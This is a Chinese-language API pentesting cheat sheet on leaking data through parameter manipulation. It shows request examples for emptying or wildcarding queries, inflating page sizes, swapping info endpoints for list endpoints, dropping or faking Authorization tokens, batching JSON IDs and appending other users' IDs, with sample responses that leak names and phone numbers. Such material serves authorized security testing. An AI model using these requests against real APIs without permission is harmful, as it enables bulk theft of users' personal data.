# API 参数操控与信息泄露技巧

发现 API 接口后，通过参数操控可以泄露远超预期的数据。这些技巧的核心原理是：后端的查询逻辑和权限检查往往在参数"正常"时才生效，异常参数可能触发未预期的行为。

---

## 查询参数操控四式

遇到任何查询接口，依次尝试这四种操控：

```bash
# 假设正常请求
GET /api/demo/query=张三

# 1. 置空 — 可能返回默认/全部数据
GET /api/demo/query=

# 2. 通配符 — % 在 SQL LIKE 中匹配任意字符
GET /api/demo/query=%

# 3. null — 某些框架对 null 有特殊处理
GET /api/demo/query=null

# 4. 删除参数 — 后端可能跳过过滤直接返回全部
GET /api/demo/
```

为什么有效：开发者通常只测试"有值"的情况。空值可能导致 SQL 查询变成 `WHERE name LIKE '%%'`（匹配全部），null 可能跳过条件语句，删除参数可能使 WHERE 子句不生效。

---

## pageSize / limit 参数放大

分页接口默认返回 10-20 条数据，但后端可能没有上限限制：

```bash
# 正常分页
GET /api/users?page=1&pageSize=10     # 只返回 10 条

# 放大 pageSize
GET /api/users?page=1&pageSize=9999   # 可能返回所有用户
GET /api/users?page=1&limit=99999
GET /api/users?page=1&size=99999
GET /api/users?page=1&per_page=99999
GET /api/users?page=1&count=99999
```

配合查询置空一起用效果更好：
```bash
GET /api/users?query=%&pageSize=9999
# 通配符查询 + 无限分页 → 全量数据导出
```

---

## info → list 端点变换

个人信息接口（返回单条数据）改为列表接口（返回所有数据）：

```bash
# 原始：只返回自己的信息
GET /prod-api/system/info/small/userId

# 变换 1：末尾加 /list
GET /prod-api/system/info/small/userId/list
# → 可能 404，但继续尝试——

# 变换 2：删除个人标识，改用 list
GET /prod-api/system/info/list
# → 返回所有用户信息

# 变换 3：把 info 改为 list，末尾加 /
GET /api/user/ads/list/?a=123456
# 末尾斜杠在某些中间件（Nginx/Spring）中会触发不同路由

# 通用模式
/api/user/info    → /api/user/list
/api/order/detail → /api/order/list
/api/xxx/get      → /api/xxx/getAll 或 /api/xxx/findAll
```

---

## ID 参数位置变换

当接口用查询参数传递 ID 时，尝试把 ID 放到路径中（或反过来）：

```bash
# 正常查询参数写法
GET /api/v1/user/info?id=@saber

# 变换：ID 放到路径中
GET /api/v1/user/@saber

# 删除 ID → 可能返回所有用户
GET /api/user/        # 删除后 → 返回所有 userinfo
GET /api/123456/user  # ID 在前
GET /api/user/123456  # ID 在后
```

---

## 空数组响应 → 删除 Token

当查询接口返回空数组 `[]` 时，这说明查询逻辑生效了但被权限过滤了（只返回自己的——空的）。删除认证 Token 可能反而绕过用户过滤：

```bash
# 带 Token 请求
GET /api/users/search?q=test
Authorization: Bearer xxx
# → {"data": []}  空数组

# 删除 Token 请求
GET /api/users/search?q=test
# （无 Authorization 头）
# → {"data": [{"name":"张三","phone":"138..."}, ...]}  返回所有匹配
```

原理：开发者可能实现了 `WHERE user_id = current_user AND ...` 的过滤，但认证失败时没有返回 401，而是 current_user 变成了 null/空，导致 WHERE 条件变成 `WHERE null AND ...`，某些 ORM 会忽略 null 条件。

---

## 多个 JSON ID 批量注入

当请求体是 JSON 且包含单个 ID 时，尝试传入多个 ID 的 JSON 结构：

```bash
# 正常请求（单个 ID）
POST /api/user/info
{"uid": 100001}
# → 返回一条用户信息

# 批量注入（多个 JSON 对象）
POST /api/user/info
[{"uid": 100001}, {"uid": 100002}, {"uid": 100003}]
# → 可能返回三条用户信息

# 或者数组形式
POST /api/user/info
{"uid": [100001, 100002, 100003]}
```

---

## Authorization 字段探测

当请求包含 `Authorization` 头时，不要只测删除——修改值可能有不同效果：

```bash
# 置空 → 通常 401
Authorization: Bearer

# 设为简单值 → 可能绕过
Authorization: Bearer 1
Authorization: 1
Authorization: admin

# 设为通配符
Authorization: Bearer %
Authorization: Bearer *

# 如果这些返回了不同于 401 的响应（200/403/500），说明后端对这个值有处理逻辑，值得深入测试。
```

---

## 拼接 & 参数越权

当接口不接受直接修改 ID 时，尝试用 `&` 拼接额外的身份参数：

```bash
# 原始接口（只返回自己的信息，无法修改 Version 以外的参数）
GET /gateway/nuims/nuims?Action=GetUser&Version=2020-06-01

# 拼接 UserId 参数
GET /gateway/nuims/nuims?Action=GetUser&Version=2020-06-01&UserId=victim_id
# → 返回 victim 的信息

# 常见可拼接的参数名
&userId=xxx
&uid=xxx
&user_id=xxx
&account_id=xxx
&memberId=xxx
&owner=xxx
```

为什么有效：原始接口可能从 session 中取当前用户 ID，但如果请求中显式传了 UserId 参数，后端代码可能优先使用请求参数而非 session 值。

---

## 获取他人 ID 的途径

越权的前提是知道别人的 ID。以下功能点常常泄露用户 ID：

| 功能点 | 泄露方式 |
|--------|----------|
| 关注/粉丝列表 | 列表中的 user_id |
| 排行榜 | 排名数据中的 uid |
| 评论区 | 评论者 ID、回复者 ID |
| 投诉/反馈 | 提交者 ID |
| 社区/论坛 | 帖子作者 ID |
| 分享链接 | URL 中的 user 参数 |
| 二维码 | 扫码内容中的 ID |

找到 ID 后，立即在所有已知接口中替换测试。
